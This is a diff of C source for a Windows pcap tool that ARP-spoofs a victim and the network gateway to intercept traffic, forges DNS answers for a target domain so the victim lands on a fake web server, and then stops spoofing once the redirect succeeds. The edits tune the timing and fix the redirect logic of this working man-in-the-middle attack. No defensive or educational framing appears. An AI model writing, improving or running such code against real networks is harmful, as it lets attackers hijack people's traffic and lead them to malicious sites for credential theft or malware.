@@ -78,10 +78,11 @@ static DWORD WINAPI start_arp_spoofing(
 		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
 		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
 		pcap_sendpacket(infect_params.fp, rearping_packet, pack_size);
-		Sleep(2000);
+		Sleep(4000);
 	}
 
 	finished_infecting = 0;
+
 	return 0;
 }
 
@@ -118,6 +119,8 @@ static void stop_arp_spoofing()
 
 	pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
 	pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
+
+	finished_infecting = 1;
 }
 
 /*
@@ -216,23 +219,17 @@ static int dns_spoofing(
 	void* dns_answer = (void*)((u_char*)dns_question + strlen(dns_question) + 5);
 	void* end_packet;
 	
-	if (!strstr(dns_question, "1293812093b0219302183092189038219038210983902183"))
+	if (!strstr(dns_question, "bestwebsitewow"))
 		return 0;
 
 	/* create fake dns packet */
 	end_packet = create_fake_dns_respones(dns_header, dns_answer, dns_question);
 
-	/* switch dst/src eth/net/transport layers */
-	SET_DST_MAC(eth_header, infect_params.victim_mac);
-	SWITCH_IPS(((ip_hdr*)(packet + sizeof(ether_hdr))));
-	SWITCH_PORTS(((udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr))));
-	
 	/* change udp/ip header length fields */
 	change_packet_sizes(packet, end_packet);
 
 	/* update status */
 	*packet_size = (BYTE*)end_packet - (BYTE*)packet;
-	finished_infecting = 1;
 
 	return 1; // true if changed
 }
@@ -283,7 +280,7 @@ void infect()
 		adapter->name,
 		65536,
 		PCAP_OPENFLAG_PROMISCUOUS,
-		5000,
+		20,
 		NULL,
 		NULL
 	);
@@ -352,6 +349,7 @@ void infect()
 		/* pointers to the intercepted packets */
 		ether_hdr* eth_header = (ether_hdr*)pkt_data;
 		ip_hdr* ip_header = (ip_hdr*)(pkt_data + sizeof(ether_hdr));
+		udp_hdr* udp_header = (udp_hdr*)(pkt_data + sizeof(ether_hdr) + sizeof(ip_hdr));
 
 		packet_size = pkt_header->caplen;
 
@@ -359,23 +357,28 @@ void infect()
 		if (COMPARE_MACS(eth_header->src_addr, infect_params.victim_mac)) // if src = taget
 		{	
 			/* check for DNS packets */
-			if (!dns_spoofing(pkt_data, &packet_size))
-				SET_DST_MAC(eth_header, infect_params.gateway_mac); // foward
+			if (dns_spoofing(pkt_data, &packet_size))
+			{
+				/* switch dst/src eth/net/transport layers */
+				SET_DST_MAC(eth_header, infect_params.victim_mac);
+				SWITCH_IPS(ip_header);
+				SWITCH_PORTS(udp_header);
+			}
+			else
+			{
+				/* forward normally */
+				SET_DST_MAC(eth_header, infect_params.gateway_mac); 
+				
+				/* check if redirect worked */
+				if (ip_header->dest_addr == fake_web)
+					stop_arp_spoofing();
+			}
 		}
 		else
 			SET_DST_MAC(eth_header, infect_params.victim_mac); // else (dst = victim)
 		SET_SRC_MAC(eth_header, infect_params.adapter->Address); // src = this
 
-		/* foward packet */
+		/* forward packet */
 		pcap_sendpacket(fp, pkt_data, packet_size);
-
-		/* redirect worked */
-		if (finished_infecting)
-		{
-			stop_arp_spoofing();
-			CloseHandle(hThread);
-			break;
-		}
 	}
-
 }
